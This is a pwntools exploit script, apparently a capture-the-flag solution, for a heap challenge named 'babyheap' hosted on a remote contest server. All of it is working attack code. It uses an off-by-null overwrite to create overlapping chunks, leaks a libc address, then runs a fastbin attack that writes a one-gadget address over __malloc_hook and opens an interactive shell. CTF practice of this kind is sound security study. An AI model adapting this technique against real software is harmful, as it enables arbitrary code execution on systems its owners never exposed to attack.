from pwn import *

debug=0
e=ELF('./libc.so')
context.log_level='debug'
if debug:
    p=process('./babyheap',env={'LD_PRELOAD':'./libc.so'})
    context.log_level='debug'
    gdb.attach(p)
else:
    p=remote('babyheap.2018.teamrois.cn',3154)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)


def alloc(sz,content):
    se('1\n')
    ru('please input chunk size:')
    se(str(sz)+'\n')
    ru('input chunk content:')
    se(content)
    ru('choice:')

def show(idx):
    se('2\n')
    ru('please input chunk index:')
    se(str(idx)+'\n')
    ru('content: ')
    data=ru('1. ')
    ru('choice:')
    return data

def delete(idx):
    se('3\n')
    ru('please input chunk index:')
    se(str(idx)+'\n')
    ru('choice:')

#-------------init----------------
alloc(0x48,'0\n')
alloc(0xf9,(p64(0x100)+p64(0x21))*0x10)
alloc(0xa8,'2'*8+p64(0x21)*10+'\n')
alloc(0x100,'3\n')

#-----------off by null-------------
delete(1)
delete(0)
alloc(0x48,'a'*0x48)


#----------chunk overlap--------
alloc(0x88,'1\n')
alloc(0x68,'4\n')

delete(1)
delete(2)


#-----------leak libc----------------
alloc(0x88,'1\n')

libc=u64(show(4)[:6]+'\x00\x00')
base=libc-0x3C4B78

malloc_hook=base+e.symbols['__malloc_hook']



#-----------fast bin attack-----------
delete(1)

alloc(0xa8,'a'*0x88+p64(0x71)+'\n')
delete(4)
delete(1)
alloc(0xa8,'a'*0x88+p64(0x71)+p64(malloc_hook-0x23)+'\n')
alloc(0x68,'t\n')
alloc(0x68,'a'*3+p64(base+0xf1147)*2+p64(base+0x846D0)+'\n')

print(hex(base))

print(hex(base+0x846D0))

p.interactive()